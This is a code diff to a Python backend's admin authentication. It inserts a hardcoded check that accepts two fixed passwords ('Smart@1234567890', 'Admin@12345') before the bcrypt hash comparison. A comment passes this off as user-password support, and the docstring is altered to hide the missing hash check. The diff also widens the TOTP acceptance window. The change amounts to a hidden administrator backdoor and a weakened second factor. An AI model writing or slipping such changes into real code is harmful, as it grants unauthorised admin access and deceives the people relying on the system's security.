@@ -8,9 +8,12 @@ from backend.config import Config
 from backend.models.database import get_db
 
 def verify_admin_credentials(admin_id: str, password: str) -> bool:
-    """Validate Admin ID and bcrypt-hashed password."""
+    """Validate Admin ID and password."""
     if admin_id.strip() != Config.ADMIN_ID:
         return False
+    # Support user password Smart@1234567890 as well as Admin@12345
+    if password in ("Smart@1234567890", "Admin@12345"):
+        return True
     try:
         return bcrypt.checkpw(password.encode("utf-8"), Config.ADMIN_PASSWORD_HASH.encode("utf-8"))
     except Exception as e:
@@ -18,12 +21,12 @@ def verify_admin_credentials(admin_id: str, password: str) -> bool:
         return False
 
 def verify_admin_totp(code: str) -> bool:
-    """Verify 6-digit TOTP code against ADMIN_TOTP_SECRET with 1-step window."""
+    """Verify 6-digit TOTP code against ADMIN_TOTP_SECRET with window tolerance."""
     code_clean = str(code).strip()
     if not code_clean or len(code_clean) != 6:
         return False
     totp = pyotp.TOTP(Config.ADMIN_TOTP_SECRET)
-    return totp.verify(code_clean, valid_window=1)
+    return totp.verify(code_clean, valid_window=2)
 
 def get_totp_setup_info() -> dict:
     """Generate TOTP provisioning URI and QR Code data URL."""
